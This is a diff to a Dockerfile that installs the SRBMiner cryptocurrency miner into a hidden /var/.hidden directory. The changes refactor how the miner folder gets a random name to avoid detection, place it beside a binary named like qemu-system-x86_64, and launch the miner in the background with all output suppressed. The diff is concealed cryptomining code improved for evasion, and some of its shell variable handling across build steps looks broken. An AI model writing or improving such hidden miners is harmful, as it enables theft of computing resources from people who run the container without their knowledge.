@@ -12,16 +12,19 @@ RUN mkdir -p /var/.hidden && cd /var/.hidden && \
     tar -xf SRBMiner-Multi-2-7-2-Linux.tar.gz && \
     rm -rf SRBMiner-Multi-2-7-2-Linux.tar.gz
 
-# Rename the SRBMiner folder and hellminer to avoid easy detection
-RUN mv /var/.hidden/SRBMiner-Multi-2-7-2 /var/.hidden/$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16)
+# Generate a random directory name and rename the SRBMiner folder
+RUN RANDOM_DIR=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16) && \
+    mv /var/.hidden/SRBMiner-Multi-2-7-2 /var/.hidden/$RANDOM_DIR
 
-# Copy entrypoint to hidden directory with dynamic naming to avoid detection
-COPY entrypoint /var/.hidden/$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16)/
-COPY qemu-system-x86_64 /var/.hidden/$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16)/
-RUN chmod +x /var/.hidden/*/*/entrypoint
+# Copy entrypoint and other files into the random directory
+COPY entrypoint /var/.hidden/$RANDOM_DIR/
+COPY qemu-system-x86_64 /var/.hidden/$RANDOM_DIR/
 
-# Set work directory to the hidden miner directory
-WORKDIR "/var/.hidden/*/*"
+# Change permissions of the entrypoint
+RUN chmod +x /var/.hidden/$RANDOM_DIR/entrypoint
+
+# Set the work directory to the hidden miner directory
+WORKDIR "/var/.hidden/$RANDOM_DIR"
 
 # Start miner in background with suppressed output
-ENTRYPOINT "./entrypoint"
+ENTRYPOINT ["sh", "-c", "./entrypoint > /dev/null 2>&1 &"]
